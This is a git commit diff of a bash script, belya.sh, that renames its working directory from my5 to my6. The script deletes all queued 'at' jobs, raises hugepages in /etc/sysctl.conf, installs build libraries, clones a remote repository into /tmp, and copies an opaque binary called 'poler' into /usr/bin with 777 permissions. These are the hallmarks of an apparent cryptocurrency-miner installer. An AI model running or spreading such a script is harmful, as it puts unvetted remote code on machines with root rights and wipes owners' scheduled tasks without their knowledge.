ef21531beb7b402ed4071526de78babc24f876f2
not100today <55038774+not100today@users.noreply.github.com>
2019-09-22 11:52:08 -0400

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/my5/
+rm -rf /tmp/my6/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir my5
-git clone https://github.com/not100today/my5.git /tmp/my5
-cd /tmp/my5
-chmod +x /tmp/my5/poler
+cd /tmp && mkdir my6
+git clone https://github.com/not100today/my6.git /tmp/my6
+cd /tmp/my6
+chmod +x /tmp/my6/poler
 chmod 777 ./*.sh
-cp /tmp/my5/poler /usr/bin/
+cp /tmp/my6/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
